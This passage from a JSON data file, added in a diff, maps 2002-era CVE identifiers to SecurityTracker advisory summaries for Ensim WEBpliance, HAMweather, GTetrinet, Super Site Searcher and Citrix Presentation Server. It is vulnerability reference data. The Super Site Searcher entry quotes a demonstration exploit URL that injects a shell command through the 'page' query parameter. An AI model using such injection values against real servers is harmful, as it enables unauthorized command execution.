+        "title": "Ensim WEBpliance Server Management Software Lets Remote Authenticated Users Receive E-mail for Other Users on the Hosted Domain",
+        "body": "A vulnerability was reported in the Ensim WEBpliance server management software. A remote user with an account on a host managed by the system can obtain e-mail messages sent to another user on the same managed domain.It is reported that a remote authenticated user with a valid account and with e-mail access on a domain managed by the software can set up an alias to receive the e-mail of another user on the same domain.The user can achieve this via the e-mail manager alias function. If the remote authenticated user enters the fully qualified e-mail address of the target user as the alias, the remote user will receive any future e-mails addressed for the target user.The vendor has reportedly been notified.",
+        "extra": "A remote authenticated user can receive e-mail sent to another user on the same managed domain.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2356": [
+      {
+        "url": "http://securitytracker.com/id?1005270",
+        "title": "HAMweather Weather Reporting CGI Security Hole May Disclose Files to Remote Users",
+        "body": "A vulnerability was reported in the web administration utility for the HAMweather CGI weather script. A remote user may be able to gain administrative control over the application and view files on the system.It is reported that if the hwadmin.cgi is not installed in a secure directory on the web server, a remote user can gain administrative access to the application. With administrative access, the remote user can change various HAMweather 2.x settings. This could cause HAMweather 2.x to disclose potentially sensitive files on the server to remote users.HAMweather 3.x is reportedly not affected by this vulnerability.",
+        "extra": "A remote user can gain administrative access to the utility. A remote user can view files on the system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2381": [
+      {
+        "url": "http://securitytracker.com/id?1005497",
+        "title": "GTetrinet Game Client Buffer Overflows Let Remote Users Execute Arbitrary Code",
+        "body": "Several buffer overflows were reported in GTetrinet, a Gtk/GNOME-based client for the Tetrinet game. A remote user may be able to execute arbitrary code on the target user's system.It is reported that there are buffer overflows in the tetrinet_inmessage() and speclist_add() functions in 'src/tetrinet.c', in the config_getthemeinfo() theme information loading function in 'src/config.c', and in other code modules.",
+        "extra": "A remote user could cause arbitrary code to be executed on the target user's system with the privileges of the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2420": [
+      {
+        "url": "http://securitytracker.com/id?1005190",
+        "title": "Super Site Searcher Input Validation Hole Lets Remote Users Execute Arbitrary Shell Commands on the Server",
+        "body": "An input validation vulnerability was reported in Super Site Searcher and Simple Site Searcher. A remote user can execute arbitrary commands on the system.SecurityFocus reported that Super Site Searcher does not properly filter user-supplied input from query string parameters in a URL request. A remote user can create a specially crafted query string that will cause commands to be executed by the operating system shell.A demonstration exploit URL is provided:http://target/searchenginepath/site_searcher.cgi?page=|command|SecurityFocus credits luca.ercoli [at] inwind.it with reporting the flaw but did not indicate where this information has been published.",
+        "extra": "A remote user can execute arbitrary shell commands on the server with the privileges of the web server.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2002-2426": [
+      {
+        "url": "http://www.securitytracker.com/id?1018962",
+        "title": "Citrix Presentation Server Published Application Information May Let Remote Users Execute Arbitrary Commands",
+        "body": "A vulnerability was reported in Citrix Presentation Server. A remote user may be able to cause arbitrary commands to be executed on the target system.A remote user can create a specially crafted .ICA file that, when loaded by the target user (initiating an ICA connection), will invoke a published application and cause the application to execute arbitrary commands on the target system. The commands will run with the privileges of the target user on the target system.The specific impact depends on the configuration of the target server.pdp reported this vulnerability.The original advisory is available at:http://www.gnucitizen.org/blog/citrix-owning-the-legitimate-backdoor/",
+        "extra": "A remote user can create a .ICA file that, when loaded by the target user, will execute arbitrary commands on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ]
+  }
+}
